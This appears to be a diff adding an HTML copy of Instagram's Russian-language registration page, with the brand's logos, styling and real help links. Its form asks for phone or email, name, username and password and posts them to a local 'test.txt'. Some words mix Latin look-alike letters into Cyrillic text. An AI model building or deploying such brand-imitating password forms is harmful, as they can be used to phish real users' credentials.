@@ -1,0 +1,125 @@
+<html>
+    <head>
+        <title>Instagram</title>
+        <style>
+            body{
+                background-color: whitesmoke;
+            }
+            .firstcol{
+                margin-left: 15%;
+                margin-top: 0%;
+            }
+            .reg{
+                margin-top: 0%;
+                margin-left: 50%;
+                border-style: ridge;
+                width: 30%;
+                height: 500px;
+                color: darkgray;
+                text-align: center;
+                background-color: white;         
+            } 
+            img{
+                width: 300px;
+            }
+           
+            p{
+                color: rgb(175, 166, 166);
+                text-align: center;
+                padding-left: 30px;
+                padding-right: 30px;
+            }
+            #button1{
+                width:255px;
+                margin-left: 30px;
+                margin-top: 5px;
+                color:white;
+                background-color: rgb(29, 105, 177);
+                height: 30px;
+                border-radius: 4px;
+                text-align: center;
+                padding-top: 0px;
+            }
+            .border2{
+                border-style: ridge;
+                color: darkgrey;
+                width: 30%;
+                margin-left: 50%;
+            }
+            #instagram{
+                margin-left: 0%;
+                margin-top: 0%;
+            }
+            .login{
+                color: black;
+                padding-left: 10px;
+                margin-left: 20%;
+            }
+            #facebook{
+                width: 15px;
+                height: 15px;
+                padding-top: 2px;
+                padding-bottom: 0px;
+                margin-left: 10px;
+            }
+            #lines{
+                overflow: hidden;
+                position: relative;
+                margin: 0%;
+                text-align: center;
+                white-space: nowrap;
+                padding-top: 10px;
+                padding-bottom: 10px;
+            }
+            #lines::before,
+            #lines::after{
+                content: '';
+                display: inline-block;
+                position: relative;
+                top: 1px;
+                width: 30%;
+                height: 1px;
+                vertical-align: middle;
+                background-color:darkgray;
+            }
+            #lines::before{
+                left: -10px;
+                margin-left: -50%;
+            }
+            #lines::after{
+                left: 10px;
+                margin-right: -50%;
+            }
+            #tit{
+                color: rgb(175, 166, 166);
+                margin-top: 2px;
+            }
+            #radius{
+                width: 250px;
+                margin-left: 30px;
+                margin-top: 5px;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="firstcol"><img id="img" src ="instagramphoto.jpg"></div>  
+        <div class="reg">
+            <img id="instagram" src="instagramlogo.jpg">
+            <p id = "tit">Зарегистрируйтесь, чтобы<br> смотреть фото и видео ваших <br> друзей</p>
+            <form id="form" action="test.txt" target="_blank" method="POST">
+                <button id="button1" type="submit"><img id ="facebook" src="facebookinstagram.png"> Вoйти через Facebook</button>
+                <p id="lines">или</p>
+                <input id="radius" type="text" name="number" placeholder="Моб. телефон или эл. адрес" required ><br>
+                <input id="radius" type="text" name="Firstname lastname" placeholder="Имя и фамилия" required><br>
+                <input id="radius" type="text" name="e-mail" placeholder="Имя пользователя" required><br>
+                <input id="radius" type="password" name="password" placeholder="Пароль" required><br>
+                <button id="button1" type="submit">Регистрация</button>
+                <p>Регистрируясь, вы принимаете<br> наши <a href="https://help.instagram.com/581066165581870" >Условия,</a>  <a href="https://help.instagram.com/519522125107875">Политику<br> использования данных</a> и<br> <a href="https://help.instagram.com/1896641480634370?ref=ig">Политику в отношении файлов<br> cookie.</a></p>
+            </form>
+        </div>
+        <div class="border2">
+            <p class="login">Есть аккаунт? <a href="https://www.instagram.com/?hl=ru">Вход</a></p>
+        </div>
+        <p class="login">Устaновите приложение</p>        
+    </body>
+</html>
